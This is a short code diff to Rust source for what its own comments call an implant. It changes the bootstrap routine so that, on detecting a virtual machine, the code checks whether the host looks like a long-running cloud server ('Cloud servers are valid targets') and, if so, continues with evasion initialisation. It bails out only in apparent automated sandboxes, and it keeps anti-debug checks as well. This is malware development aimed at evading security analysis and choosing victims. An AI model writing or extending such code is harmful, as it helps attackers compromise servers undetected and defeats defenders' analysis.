@@ -73,17 +73,22 @@ unsafe fn bootstrap() -> Option<LiveNtdll> {
         env_skip || cfg!(nyx_skip_sandbox)
     };
 
+    // VM/sandbox detection — BEFORE we spend cycles on evasion init.
     if !skip_sandbox
         && matches!(
             unsafe { crate::envprobe::looks_like_analysis_env() },
             crate::envprobe::EnvVerdict::AnalysisEnv
         )
     {
-        // VM/sandbox detected → bail out. A production implant may instead
-        // drop to a dormant ultra-low-frequency cycle here to defeat
-        // behavior profiling; for now we treat it the same as a failed
-        // locate (the caller exits cleanly).
-        return None;
+        // VM detected. Before bailing, check: is this a legitimate cloud
+        // server (long uptime, real workload) or an automated sandbox
+        // (minutes old, minimal processes)? Cloud servers are valid targets;
+        // we should NOT abort on them just because they're VMs.
+        if !unsafe { crate::envprobe::looks_like_cloud_server() } {
+            // Looks like a sandbox — bail out.
+            return None;
+        }
+        // Cloud server confirmed — proceed with evasion init.
     }
     if !skip_sandbox && crate::antidebug::looks_sandboxed(600) {
         // Under a debugger or inside a fresh sandbox → bail out.
